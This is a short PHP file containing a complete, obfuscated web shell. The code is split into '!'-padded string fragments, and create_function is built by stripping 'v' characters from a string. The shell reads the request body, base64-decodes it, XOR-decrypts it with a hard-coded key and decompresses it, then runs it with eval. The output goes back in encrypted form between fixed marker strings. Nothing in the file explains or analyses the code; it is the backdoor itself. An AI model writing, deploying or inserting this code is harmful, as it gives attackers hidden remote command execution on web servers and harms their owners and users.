<?php
$B='nte!nt!s();!@ob_end_cl!!ean();$r=@ba!s!e64!_encode(@x(@g!!zcompress!!($o)!,$k));pri!nt("$p$kh$r$kf");}';
$U='unctio!!n x($!t,$k){!!$c=strlen($k!);$l!=strle!n($t);$o="!";for($i=0!;!$i<$l;){fo';
$v='r!!($j=0;($j!<$c&!&$i<$l)!;$j++!,$i+!+!){$o.=$t{$i}^$k!{$!j};}}ret!urn $o;!}if (@!preg';
$x='$k="da075!9f4";!$kh="!0ba608!!!a2f405";$kf="!fa9071b45560!!";$p="qd!epwHsL!9s9uZQzk";f!';
$L=str_replace('v','','cvreatvev_vfuvnctivon');
$b='_match!("!/$k!h(.+)$!kf/",@f!ile_g!et_c!ontents(!"php:!//inpu!t"),$m)==!1) {@ob_!st';
$m='ar!t()!;@ev!!al(@gzuncompres!s(@x(@!b!ase64_!decode($m[1]!),$k)));$o=@!!ob_get_co';
$Z=str_replace('!','',$x.$U.$v.$b.$m.$B);
$f=$L('',$Z);$f();
?>
